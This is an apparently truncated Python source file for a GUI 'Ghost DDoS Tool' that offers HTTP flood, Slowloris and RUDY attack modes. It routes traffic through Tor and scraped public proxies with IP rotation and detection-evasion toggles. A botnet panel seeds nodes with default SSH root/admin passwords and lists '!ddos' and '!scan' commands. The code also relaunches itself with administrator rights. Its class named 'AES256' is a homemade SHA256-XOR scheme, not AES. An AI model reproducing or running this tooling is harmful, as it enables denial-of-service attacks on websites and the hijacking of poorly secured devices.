import asyncio
import random
import aiohttp
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
from datetime import datetime
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from aiohttp_socks import ProxyConnector
import socks
import socket
import platform
from stem import Signal
from stem.control import Controller
import dns.resolver
import subprocess
import os
import json
import ssl
import sys
import ctypes
import re
import base64
import hashlib
from urllib.parse import urlparse
import ipaddress
import h2.connection
import h2.events
import telnetlib3
import paramiko
import nmap
import scapy.all as scapy
from threading import Lock
import queue
import uuid
import sqlite3
import zlib
import csv
from io import StringIO

class AES256:
    def __init__(self, key):
        self.key = hashlib.sha256(key.encode()).digest()
        self.bs = 16
    
    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = os.urandom(self.bs)
        cipher = hashlib.sha256(iv + self.key).digest()
        encrypted = bytearray()
        for i in range(0, len(raw), self.bs):
            block = raw[i:i+self.bs]
            encrypted_block = bytearray([block[j] ^ cipher[j % len(cipher)] for j in range(len(block))])
            encrypted.extend(encrypted_block)
            cipher = hashlib.sha256(encrypted_block + self.key).digest()
        return base64.b64encode(iv + encrypted)
    
    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:self.bs]
        encrypted = enc[self.bs:]
        cipher = hashlib.sha256(iv + self.key).digest()
        decrypted = bytearray()
        for i in range(0, len(encrypted), self.bs):
            block = encrypted[i:i+self.bs]
            decrypted_block = bytearray([block[j] ^ cipher[j % len(cipher)] for j in range(len(block))])
            decrypted.extend(decrypted_block)
            cipher = hashlib.sha256(block + self.key).digest()
        return self._unpad(decrypted).decode('utf-8')
    
    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs).encode()
    
    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

class GhostDDoSTool:
    def __init__(self, root):
        self.root = root
        self.root.title("⍟ Ghost DDoS Tool v7.0 ⍟")
        self.root.geometry("1500x1000")
        self.log_text = None
        self.check_admin_privileges()
        
        self.quantum_ascii = """
⠀⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀⠀⠀⠀⠀⠀
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⣆⠀⠀⠀⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠋⠀⠀⠀⠀
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⠙⢆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⣿⣿⣿⠏⢧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢳⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⢿⣿⣿⠏
        GHOST DDOS TOOL v7.0 - QUANTUM BOTNET EDITION
        """
        
        self.setup_theme()
        self.attack_active = False
        self.total_requests = 0
        self.successful_requests = 0
        self.start_time = None
        self.active_proxies = []
        self.tor_process = None
        
        self.free_proxies = []
        self.premium_proxies = []
        self.tor_proxies = ["socks5://127.0.0.1:9050"]
        self.user_proxies = []
        self.ua = UserAgent()
        self.os_type = platform.system()
        
        self.tor_control_port = 9051
        self.tor_socks_port = 9050
        self.tor_password = None
        
        self.stealth_mode = False
        self.ip_rotation_interval = 50
        self.max_threads = 10000
        self.ctf_mode = False
        self.evasion_level = 3
        
        self.botnet_nodes = []
        self.botnet_lock = Lock()
        self.command_queue = queue.Queue()
        self.botnet_active = False
        self.botnet_type = "Mirai"
        
        self.cipher = AES256("gh0stn3t-3ncrypt!0n-k3y")
        
        self.setup_gui()
        self.load_premium_proxies()
        self.load_free_proxies_from_url("https://autumn.revolt.chat/attachments/zfoRxfdIYzipeg9cNiEgOvEt8g33bfv_u7M0qbcWfr/Free_Proxy_List.csv")
        self.check_tor_status()
        self.start_tor_async()
        threading.Thread(target=self.botnet_monitor, daemon=True).start()
        self.init_botnet_db()
        self.load_botnet_nodes()

    def init_botnet_db(self):
        try:
            self.conn = sqlite3.connect(':memory:')
            self.cursor = self.conn.cursor()
            self.cursor.execute('''CREATE TABLE IF NOT EXISTS botnet_nodes
                                (id TEXT PRIMARY KEY,
                                ip TEXT,
                                port INTEGER,
                                username TEXT,
                                password TEXT,
                                node_type TEXT,
                                last_seen REAL,
                                is_active INTEGER)''')
            self.conn.commit()
        except Exception as e:
            self.log(f"Database error: {str(e)}", "ERROR")

    def load_botnet_nodes(self):
        try:
            # Simulate loading pre-configured nodes (in real use, would load from encrypted storage)
            default_nodes = [
                {"ip": "192.168.1.101", "port": 22, "username": "root", "password": "password"},
                {"ip": "192.168.1.102", "port": 22, "username": "admin", "password": "admin123"},
                {"ip": "192.168.1.103", "port": 22, "username": "user", "password": "123456"}
            ]
            
            for node in default_nodes:
                self._add_botnet_node(node["ip"], node["port"], node["username"], node["password"])
            
            self.log("Pre-configured botnet nodes loaded", "BOTNET")
        except Exception as e:
            self.log(f"Error loading botnet nodes: {str(e)}", "ERROR")

    def setup_theme(self):
        self.bg_color = "#1e1e1e"
        self.text_color = "#d4d4d4"
        self.accent_color = "#569cd6"
        self.error_color = "#f48771"
        self.success_color = "#608b4e"
        self.warning_color = "#dcdcaa"
        self.attack_color = "#c586c0"
        self.proxy_color = "#4ec9b0"
        self.tor_color = "#9cdcfe"
        self.botnet_color = "#d7ba7d"
        
        self.font_small = ("Consolas", 10)
        self.font_medium = ("Consolas", 12)
        self.font_large = ("Consolas", 14, "bold")
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        self.style.configure('.', background=self.bg_color, foreground=self.text_color)
        self.style.configure('TFrame', background=self.bg_color)
        self.style.configure('TLabel', background=self.bg_color, foreground=self.text_color)
        self.style.configure('TButton', background="#252526", foreground=self.text_color, borderwidth=1)
        self.style.configure('TEntry', fieldbackground="#252526", foreground=self.text_color)
        self.style.configure('TCombobox', fieldbackground="#252526", foreground=self.text_color)
        self.style.configure('TScrollbar', background="#252526")
        self.style.map('TButton', 
                      background=[('active', '#333333')],
                      foreground=[('active', self.text_color)])

    def setup_gui(self):
        self.root.configure(bg=self.bg_color)
        
        main_paned = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL)
        main_paned.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        left_panel = ttk.Frame(main_paned)
        main_paned.add(left_panel, weight=3)
        
        right_panel = ttk.Frame(main_paned)
        main_paned.add(right_panel, weight=1)
        
        header_frame = tk.Frame(left_panel, bg=self.bg_color)
        header_frame.pack(fill=tk.X, pady=5)
        
        ascii_label = tk.Label(header_frame, 
                             text=self.quantum_ascii, 
                             font=("Courier New", 8), 
                             fg=self.accent_color,
                             bg=self.bg_color,
                             justify=tk.LEFT)
        ascii_label.pack(side=tk.LEFT)
        
        version_frame = tk.Frame(header_frame, bg=self.bg_color)
        version_frame.pack(side=tk.RIGHT, padx=10)
        
        tk.Label(version_frame, text="Ghost DDoS Tool", 
               font=self.font_large, fg=self.text_color, bg=self.bg_color).pack()
        tk.Label(version_frame, text="v7.0 | Quantum Botnet Engine", 
               font=self.font_medium, fg=self.accent_color, bg=self.bg_color).pack()
        
        control_frame = tk.Frame(left_panel, bg=self.bg_color)
        control_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(control_frame, text="Target URL:", 
                font=self.font_medium, fg=self.text_color, bg=self.bg_color).grid(row=0, column=0, sticky=tk.W)
        self.url_entry = ttk.Entry(control_frame, width=70, font=self.font_medium)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        
        tk.Label(control_frame, text="Threads:", 
                font=self.font_medium, fg=self.text_color, bg=self.bg_color).grid(row=0, column=2, padx=(20,0))
        self.threads_entry = ttk.Spinbox(control_frame, from_=1, to=self.max_threads, 
                                       width=5, font=self.font_medium)
        self.threads_entry.set(1000)
        self.threads_entry.grid(row=0, column=3)
        
        self.attack_btn = ttk.Button(control_frame, 
                                    text="⏣ INITIATE GHOST STRIKE", 
                                    command=self.toggle_attack)
        self.attack_btn.grid(row=0, column=4, padx=20)
        
        self.botnet_btn = ttk.Button(control_frame, 
                                   text="🌀 ACTIVATE BOTNET", 
                                   command=self.toggle_botnet)
        self.botnet_btn.grid(row=0, column=5, padx=5)
        
        adv_frame = tk.LabelFrame(left_panel, text="⚡ Ghost Configuration", 
                                font=self.font_medium, fg=self.accent_color, 
                                bg=self.bg_color, bd=2, relief=tk.GROOVE)
        adv_frame.pack(fill=tk.X, pady=5)
        
        self.setup_proxy_controls(adv_frame)
        self.setup_attack_controls(adv_frame)
        self.setup_botnet_controls(adv_frame)
        self.setup_tor_controls(adv_frame)
        self.setup_evasion_controls(adv_frame)
        self.setup_stats_frame(left_panel)
        self.setup_log_console(left_panel)
        self.setup_status_bar()
        
        botnet_cmd_frame = tk.LabelFrame(right_panel, text="🤖 Botnet Commands",
                                       font=self.font_medium, fg=self.botnet_color,
                                       bg=self.bg_color, bd=2, relief=tk.GROOVE)
        botnet_cmd_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        commands = [
            ("!scan", "Scan for vulnerable devices"),
            ("!connect [ip] [port] [user] [pass]", "Connect to a new botnet node"),
            ("!list", "List all connected nodes"),
            ("!status", "Show botnet status"),
            ("!ddos [target] [threads]", "Launch DDoS attack from all nodes"),
            ("!httpflood [target] [duration]", "HTTP Flood attack"),
            ("!stop", "Stop all attacks"),
            ("!help", "Show this help message")
        ]
        
        cmd_canvas = tk.Canvas(botnet_cmd_frame, bg=self.bg_color, highlightthickness=0)
        scrollbar = ttk.Scrollbar(botnet_cmd_frame, orient="vertical", command=cmd_canvas.yview)
        scrollable_frame = ttk.Frame(cmd_canvas)
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: cmd_canvas.configure(
                scrollregion=cmd_canvas.bbox("all")
            )
        )
        
        cmd_canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        cmd_canvas.configure(yscrollcommand=scrollbar.set)
        
        cmd_canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        for i, (cmd, desc) in enumerate(commands):
            cmd_frame = tk.Frame(scrollable_frame, bg=self.bg_color)
            cmd_frame.pack(fill=tk.X, padx=5, pady=2)
            
            tk.Label(cmd_frame, text=cmd, font=self.font_small, 
                   fg=self.botnet_color, bg=self.bg_color, anchor=tk.W).pack(side=tk.LEFT)
            
            tk.Label(cmd_frame, text=desc, font=self.font_small, 
                   fg=self.text_color, bg=self.bg_color, wraplength=250, justify=tk.LEFT).pack(side=tk.LEFT, padx=5)

    def setup_proxy_controls(self, parent):
        tk.Label(parent, text="Proxy Mode:", 
                font=self.font_small, fg=self.text_color, bg=self.bg_color).grid(row=0, column=0)
        
        self.proxy_mode = ttk.Combobox(parent, values=[
            "Tor Network", 
            "Free Public Proxies", 
            "Custom Proxies", 
            "Hybrid Mode (Recommended)",
            "Direct Connection"
        ], font=self.font_small, width=25)
        self.proxy_mode.set("Hybrid Mode (Recommended)")
        self.proxy_mode.grid(row=0, column=1, padx=5)
        
        tk.Label(parent, text="Custom Proxies:", 
                font=self.font_small, fg=self.text_color, bg=self.bg_color).grid(row=0, column=2)
        self.custom_proxy_entry = ttk.Entry(parent, width=40, font=self.font_small)
        self.custom_proxy_entry.grid(row=0, column=3, padx=5)
        self.custom_proxy_entry.insert(0, "ip:port,ip:port,...")
        
        ttk.Button(parent, text="Test Proxies", command=self.test_proxy_list).grid(row=0, column=4, padx=5)
        ttk.Button(parent, text="Refresh Public", command=self.load_proxy_sources).grid(row=0, column=5, padx=5)
        ttk.Button(parent, text="Load From File", command=self.load_proxies_from_file).grid(row=0, column=6, padx=5)

    def setup_attack_controls(self, parent):
        tk.Label(parent, text="Attack Vector:", 
                font=self.font_small, fg=self.text_color, bg=self.bg_color).grid(row=1, column=0, pady=(10,0))
        
        self.attack_type = ttk.Combobox(parent, values=[
            "HTTP Flood", 
            "Slowloris", 
            "RUDY", 
            "Mixed Attack",
            "CTF Mode"
        ], font=self.font_small, width=15)
        self.attack_type.set("HTTP Flood")
        self.attack_type.grid(row=1, column=1, padx=5, pady=(10,0))
        
        tk.Label(parent, text="IP Rotation:", 
                font=self.font_small, fg=self.text_color, bg=self.bg_color).grid(row=1, column=2, pady=(10,0))
        
        self.ip_rotation = ttk.Combobox(parent, values=[
            "Every 10 Requests",
            "Every 50 Requests",
            "Every 100 Requests",
            "Random Rotation",
            "No Rotation"
        ], font=self.font_small, width=15)
        self.ip_rotation.set("Every 50 Requests")
        self.ip_rotation.grid(row=1, column=3, padx=5, pady=(10,0))
        
        self.stealth_toggle = ttk.Checkbutton(parent, text="Stealth Mode", 
                                            style="Toolbutton", command=self.toggle_stealth)
        self.stealth_toggle.grid(row=1, column=4, padx=5, pady=(10,0))
        
        self.ctf_toggle = ttk.Checkbutton(parent, text="CTF Mode", 
                                        style="Toolbutton", command=self.toggle_ctf_mode)
        self.ctf_toggle.grid(row=1, column=5, padx=5, pady=(10,0))

    def setup_botnet_controls(self, parent):
        botnet_frame = tk.Frame(parent, bg=self.bg_color)
        botnet_frame.grid(row=2, column=0, columnspan=7, sticky=tk.W, pady=5)
        
        tk.Label(botnet_frame, text="Botnet Type:", 
               font=self.font_small, fg=self.botnet_color, bg=self.bg_color).pack(side=tk.LEFT, padx=5)
        
        self.botnet_type_combo = ttk.Combobox(botnet_frame, values=[
            "Mirai", 
            "Qbot", 
            "Zeus", 
            "Custom"
        ], font=self.font_small, width=10)
        self.botnet_type_combo.set("Mirai")
        self.botnet_type_combo.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(botnet_frame, text="Scan Nodes", command=self.scan_botnet_nodes).pack(side=tk.LEFT, padx=5)
        
        self.botnet_cmd_entry = ttk.Entry(botnet_frame, width=40, font=self.font_small)
        self.botnet_cmd_entry.pack(side=tk.LEFT, padx=5)
        self.botnet_cmd_entry.insert(0, "Enter botnet command...")
        
        ttk.Button(botnet_frame, text="Send Command", command=self.send_botnet_command).pack(side=tk.LEFT, padx=5)

    def setup_tor_controls(self, parent):
        tor_frame = tk.Frame(parent, bg=self.bg_color)
        tor_frame.grid(row=3, column=0, columnspan=7, sticky=tk.W, pady=5)
        
        self.tor_status = tk.Label(tor_frame, text="Tor: Not Active", 
                                 fg=self.error_color, bg=self.bg_color, font=self.font_small)
        self.tor_status.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(tor_frame, text="Start Tor", command=self.start_tor).pack(side=tk.LEFT, padx=5)
        ttk.Button(tor_frame, text="Stop Tor", command=self.stop_tor).pack(side=tk.LEFT, padx=5)
        ttk.Button(tor_frame, text="New Identity", command=self.new_tor_identity).pack(side=tk.LEFT, padx=5)

    def setup_evasion_controls(self, parent):
        evasion_frame = tk.Frame(parent, bg=self.bg_color)
        evasion_frame.grid(row=4, column=0, columnspan=7, sticky=tk.W, pady=5)
        
        tk.Label(evasion_frame, text="Evasion Level:", 
               font=self.font_small, fg=self.text_color, bg=self.bg_color).pack(side=tk.LEFT, padx=5)
        
        self.evasion_level_combo = ttk.Combobox(evasion_frame, values=[
            "Level 1 (Basic)", 
            "Level 2 (Intermediate)", 
            "Level 3 (Advanced)", 
            "Level 4 (Expert)"
        ], font=self.font_small, width=20)
        self.evasion_level_combo.set("Level 3 (Advanced)")
        self.evasion_level_combo.pack(side=tk.LEFT, padx=5)
        
        self.javascript_evasion = ttk.Checkbutton(evasion_frame, text="JS Evasion", 
                                                style="Toolbutton", command=self.toggle_js_evasion)
        self.javascript_evasion.pack(side=tk.LEFT, padx=5)
        
        self.header_spoofing = ttk.Checkbutton(evasion_frame, text="Header Spoofing", 
                                            style="Toolbutton", command=self.toggle_header_spoofing)
        self.header_spoofing.pack(side=tk.LEFT, padx=5)
        
        self.ip_obfuscation = ttk.Checkbutton(evasion_frame, text="IP Obfuscation", 
                                           style="Toolbutton", command=self.toggle_ip_obfuscation)
        self.ip_obfuscation.pack(side=tk.LEFT, padx=5)

    def setup_stats_frame(self, parent):
        stats_frame = tk.Frame(parent, bg=self.bg_color)
        stats_frame.pack(fill=tk.X, pady=5)
        
        stats = [
            ("⏱️ Total Requests", "0", self.accent_color),
            ("✅ Success Rate", "0%", self.success_color),
            ("⌛ Duration", "00:00:00", self.accent_color),
            ("⚡ Req/Sec", "0", self.accent_color),
            ("🌐 Active Proxies", "0", self.accent_color),
            ("🌀 Tor Circuits", "0", self.warning_color),
            ("🤖 Botnet Nodes", "0", self.botnet_color)
        ]
        
        self.stats_vars = {}
        
        for i, (name, default, color) in enumerate(stats):
            tk.Label(stats_frame, text=f"{name}:", 
                   font=self.font_small, fg=self.text_color, bg=self.bg_color).grid(row=0, column=i*2)
            
            self.stats_vars[name] = tk.StringVar(value=default)
            tk.Label(stats_frame, textvariable=self.stats_vars[name], 
                   font=self.font_small, fg=color, bg=self.bg_color).grid(row=0, column=i*2+1, padx=(0,10))

    def setup_log_console(self, parent):
        log_frame = tk.LabelFrame(parent, text="Attack Logs", 
                                font=self.font_medium, fg=self.accent_color, 
                                bg=self.bg_color, bd=2, relief=tk.GROOVE)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, width=150, height=20,
                                                font=self.font_small, bg="#252526", fg=self.text_color)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        self.log_text.tag_config("INFO", foreground=self.text_color)
        self.log_text.tag_config("SUCCESS", foreground=self.success_color)
        self.log_text.tag_config("WARNING", foreground=self.warning_color)
        self.log_text.tag_config("ERROR", foreground=self.error_color)
        self.log_text.tag_config("TOR", foreground=self.tor_color)
        self.log_text.tag_config("ATTACK", foreground=self.attack_color)
        self.log_text.tag_config("PROXY", foreground=self.proxy_color)
        self.log_text.tag_config("BOTNET", foreground=self.botnet_color)

    def setup_status_bar(self):
        self.status_var = tk.StringVar()
        self.status_var.set("🟢 Systems Ready | Ghost Mode: Inactive")
        status_bar = tk.Label(self.root, textvariable=self.status_var, 
                            font=self.font_small, fg=self.text_color, 
                            bg="#252526", anchor=tk.W)
        status_bar.pack(fill=tk.X, padx=10, pady=(0,10))

    def check_admin_privileges(self):
        try:
            if self.os_type == "Windows":
                if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                    sys.exit()
            else:
                if os.getuid() != 0:
                    subprocess.call(['sudo', 'python3'] + sys.argv)
                    sys.exit()
        except Exception as e:
            self.log(f"Admin check failed: {str(e)}", "ERROR")

    def load_premium_proxies(self):
        try:
            self.premium_proxies = []
            self.log("Loaded premium proxies", "INFO")
        except Exception as e:
            self.log(f"Failed to load premium proxies: {str(e)}", "ERROR")

    def load_free_proxies_from_url(self, url):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                csv_content = StringIO(response.text)
                csv_reader = csv.reader(csv_content)
                next(csv_reader, None)
                self.free_proxies = [f"{row[0]}:{row[1]}" for row in csv_reader if len(row) >= 2]
                self.log(f"Loaded {len(self.free_proxies)} free proxies from URL", "SUCCESS")
            else:
                self.log(f"Failed to download proxy list: HTTP {response.status_code}", "ERROR")
        except Exception as e:
            self.log(f"Error loading free proxies: {str(e)}", "ERROR")

    def start_tor_async(self):
        threading.Thread(target=self.start_tor, daemon=True).start()

    def check_tor_status(self):
        try:
            with Controller.from_port(port=self.tor_control_port) as controller:
                controller.authenticate()
                self.tor_status.config(text="Tor: Running", fg=self.success_color)
                return True
        except:
            self.tor_status.config(text="Tor: Not Active", fg=self.error_color)
            return False

    def start_tor(self):
        if self.check_tor_status():
            self.log("Tor is already running", "TOR")
            return
            
        try:
            if self.os_type == "Windows":
                self.log("Starting Tor service on Windows...", "TOR")
                try:
                    subprocess.run(["net", "start", "tor"], check=True, capture_output=True)
                except:
                    try:
                        tor_path = os.path.join(os.getenv("ProgramFiles"), "Tor", "tor.exe")
                        if os.path.exists(tor_path):
                            self.tor_process = subprocess.Popen([tor_path])
                        else:
                            self.log("Tor not found. Please install Tor first.", "ERROR")
                            return
                    except Exception as e:
                        self.log(f"Failed to start Tor: {str(e)}", "ERROR")
                        return
            else:
                self.log("Starting Tor service...", "TOR")
                try:
                    subprocess.run(["sudo", "service", "tor", "start"], check=True)
                except:
                    try:
                        subprocess.run(["sudo", "systemctl", "start", "tor"], check=True)
                    except Exception as e:
                        self.log(f"Failed to start Tor service: {str(e)}", "ERROR")
                        return
            
            time.sleep(5)
            
            if self.check_tor_status():
                self.log("Tor started successfully", "TOR")
                self.status_var.set("Tor service activated")
                tor_ip = self.get_tor_ip()
                if tor_ip:
                    self.log(f"Current Tor IP: {tor_ip}", "TOR")
            else:
                self.log("Failed to verify Tor status", "ERROR")
        except Exception as e:
            self.log(f"Tor start failed: {str(e)}", "ERROR")

    def stop_tor(self):
        try:
            if self.os_type == "Windows":
                if self.tor_process:
                    self.tor_process.terminate()
                    self.tor_process = None
                try:
                    subprocess.run(["net", "stop", "tor"], check=True)
                except:
                    pass
            else:
                try:
                    subprocess.run(["sudo", "service", "tor", "stop"], check=True)
                except:
                    try:
                        subprocess.run(["sudo", "systemctl", "stop", "tor"], check=True)
                    except:
                        pass
            
            self.log("Tor service stopped", "TOR")
            self.tor_status.config(text="Tor: Not Active", fg=self.error_color)
        except Exception as e:
            self.log(f"Failed to stop Tor: {str(e)}", "ERROR")

    def new_tor_identity(self):
        if not self.check_tor_status():
            self.log("Tor is not running", "ERROR")
            return
            
        try:
            with Controller.from_port(port=self.tor_control_port) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                self.log("New Tor identity requested", "TOR")
                self.status_var.set("Tor circuit renewed")
                
                time.sleep(5)
                new_ip = self.get_tor_ip()
                if new_ip:
                    self.log(f"New Tor IP: {new_ip}", "TOR")
        except Exception as e:
            self.log(f"Failed to get new identity: {str(e)}", "ERROR")

    def get_tor_ip(self):
        try:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_socks_port)
            socket.socket = socks.socksocket
            
            response = requests.get('https://api.ipify.org?format=json', timeout=10)
            ip_data = response.json()
            
            socks.set_default_proxy()
            socket.socket = socket._socketobject
            
            return ip_data.get('ip', 'Unknown')
        except Exception as e:
            self.log(f"Failed to get Tor IP: {str(e)}", "ERROR")
            return None

    def load_proxy_sources(self):
        self.log("Loading proxy sources from multiple providers...", "INFO")
        threading.Thread(target=self._load_proxy_sources_thread, daemon=True).start()

    def _load_proxy_sources_thread(self):
        try:
            sources = [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
                "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt",
                "https://www.proxy-list.download/api/v1/get?type=http",
                "https://www.proxyscan.io/download?type=http"
            ]
            
            all_proxies = []
            
            for url in sources:
                try:
                    headers = {'User-Agent': self.ua.random}
                    response = requests.get(url, headers=headers, timeout=15)
                    
                    if response.status_code == 200:
                        if "proxyscrape" in url or "raw.githubusercontent" in url or "proxy-list.download" in url:
                            proxies = [p.strip() for p in response.text.splitlines() if p.strip() and ':' in p]
                        else:
                            ip_port_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'
                            proxies = re.findall(ip_port_pattern, response.text)
                        
                        if proxies:
                            all_proxies.extend(proxies)
                            self.log(f"Loaded {len(proxies)} proxies from {url.split('/')[2]}", "INFO")
                except Exception as e:
                    self.log(f"Failed to load from {url.split('/')[2]}: {str(e)}", "ERROR")
            
            unique_proxies = list(set(all_proxies))
            valid_proxies = []
            
            for proxy in unique_proxies:
                parts = proxy.split(':')
                if len(parts) == 2 and parts[1].isdigit():
                    valid_proxies.append(proxy)
            
            self.free_proxies = valid_proxies
            self.log(f"Total unique proxies loaded: {len(self.free_proxies)}", "SUCCESS")
            
            self.test_proxy_list()
        except Exception as e:
            self.log(f"Proxy loading failed: {str(e)}", "ERROR")

    def load_proxies_from_file(self):
        filepath = filedialog.askopenfilename(title="Select Proxy File",
                                           filetypes=(("Text files", "*.txt"), 
                                                     ("All files", "*.*")))
        if filepath:
            try:
                with open(filepath) as f:
                    proxies = [line.strip() for line in f if line.strip()]
                
                valid_proxies = []
                for proxy in proxies:
                    parts = proxy.split(':')
                    if len(parts) == 2 and parts[1].isdigit():
                        valid_proxies.append(proxy)
                
                self.user_proxies = valid_proxies
                self.log(f"Loaded {len(self.user_proxies)} valid proxies from file", "SUCCESS")
                self.test_proxy_list()
            except Exception as e:
                self.log(f"Failed to load proxies: {str(e)}", "ERROR")

    def test_proxy_list(self):
        self.log("Testing proxy list for working proxies...", "INFO")
        threading.Thread(target=self._test_proxy_list_thread, daemon=True).start()

    def _test_proxy_list_thread(self):
        try:
            test_url = "http://httpbin.org/ip"
            proxies_to_test = []
            
            proxy_mode = self.proxy_mode.get()
            
            if proxy_mode == "Tor Network":
                return
            elif proxy_mode == "Free Public Proxies":
                proxies_to_test = self.free_proxies[:200]
            elif proxy_mode == "Custom Proxies":
                custom_proxies = self.custom_proxy_entry.get().split(',')
                proxies_to_test = [p.strip() for p in custom_proxies if p.strip()]
            elif proxy_mode == "Hybrid Mode (Recommended)":
                proxies_to_test = self.free_proxies[:100] + (self.user_proxies[:100] if self.user_proxies else [])
            
            working_proxies = []
            
            def test_proxy(proxy):
                try:
                    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                    response = requests.get(test_url, proxies=proxies, timeout=10)
                    if response.status_code == 200:
                        self.log(f"Proxy {proxy} is working", "PROXY")
                        return proxy
                except Exception as e:
                    return None
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                results = list(executor.map(test_proxy, proxies_to_test))
            
            working_proxies = [p for p in results if p is not None]
            
            self.active_proxies = working_proxies
            self.stats_vars["🌐 Active Proxies"].set(str(len(self.active_proxies)))
            self.log(f"Proxy testing completed. Working proxies: {len(self.active_proxies)}", "SUCCESS")
        except Exception as e:
            self.log(f"Proxy testing failed: {str(e)}", "ERROR")

    def toggle_stealth(self):
        self.stealth_mode = not self.stealth_mode
        if self.stealth_mode:
            self.log("Stealth mode activated - Slower but more undetectable", "INFO")
        else:
            self.log("Stealth mode deactivated - Maximum speed", "INFO")

    def toggle_ctf_mode(self):
        self.ctf_mode = not self.ctf_mode
        if self.ctf_mode:
            self.attack_type.set("CTF Mode")
            self.log("CTF Mode activated - Specialized attack patterns", "INFO")
